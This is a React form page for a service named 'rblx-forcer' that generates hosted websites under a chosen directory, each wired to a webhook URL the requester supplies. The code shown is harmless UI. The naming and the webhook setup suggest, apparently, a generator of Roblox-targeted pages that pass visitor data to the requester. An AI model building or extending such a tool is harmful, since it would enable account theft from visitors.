import { useState } from "react";

export default function Home() {
  const [title, setTitle] = useState("");
  const [directory, setDirectory] = useState("");
  const [webhookUrl, setWebhookUrl] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!title || !directory || !webhookUrl) {
      setMessage("⚠️ Please fill in all fields.");
      return;
    }

    setLoading(true);
    setMessage("");

    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title, directory, webhookUrl }),
      });

      const data = await res.json();

      if (res.ok) {
        setMessage(`✅ Website created at: https://rblx-forcer.vercel.app/${directory}`);
      } else {
        setMessage(`❌ Error: ${data.error}`);
      }
    } catch (error) {
      setMessage("❌ Something went wrong.");
    }

    setLoading(false);
  };

  return (
    <main className="min-h-screen flex flex-col items-center justify-center bg-gray-100 p-6">
      <div className="bg-white shadow-xl rounded-2xl p-8 w-full max-w-lg">
        <h1 className="text-3xl font-bold text-center mb-6">Generate Website</h1>

        <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
          <input
            type="text"
            placeholder="Title"
            value={title}
            onChange={(e) => setTitle(e.target.value)}
            className="p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />

          <input
            type="text"
            placeholder="Directory Name"
            value={directory}
            onChange={(e) => setDirectory(e.target.value)}
            className="p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
          <p className="text-sm text-gray-500">
            Your site will be available at: https://rblx-forcer.vercel.app/{directory}
          </p>

          <input
            type="text"
            placeholder="Webhook URL"
            value={webhookUrl}
            onChange={(e) => setWebhookUrl(e.target.value)}
            className="p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
          />
          <p className="text-sm text-gray-500">Webhook for connecting your users</p>

          <button
            type="submit"
            disabled={loading}
            className="bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition disabled:opacity-50"
          >
            {loading ? "Generating..." : "Generate Website"}
          </button>
        </form>

        {message && <p className="mt-4 text-center text-gray-700">{message}</p>}
      </div>
    </main>
  );
}
